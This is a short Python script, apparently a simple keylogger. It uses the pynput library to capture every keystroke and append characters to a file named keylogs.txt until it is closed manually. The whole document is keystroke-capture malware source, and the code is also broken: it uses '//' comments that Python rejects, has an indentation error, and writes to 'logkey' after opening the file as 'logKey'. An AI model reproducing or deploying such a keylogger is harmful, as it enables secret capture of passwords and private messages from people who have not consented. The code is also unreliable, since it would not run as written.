from pynput import keyboard							

  def keyPressed(key):								//keypress function defined to record key strokes and write them to keylogs.txt
		print(str(key))
		with open("keylogs.txt", 'a') as logKey:
			try:
				char = key.char
				logkey.write(char)
			except:
				print("error getting char")				//print string if error is detected


if __name__ == "__main__":								
	listener = keyboard.Listener(on_press=keyPressed)	//listener object from pynput keyboard that calls keyPressed when keystrokes are detected then starts listener which will not stop until program is closed manually
	listener.start()
	input()
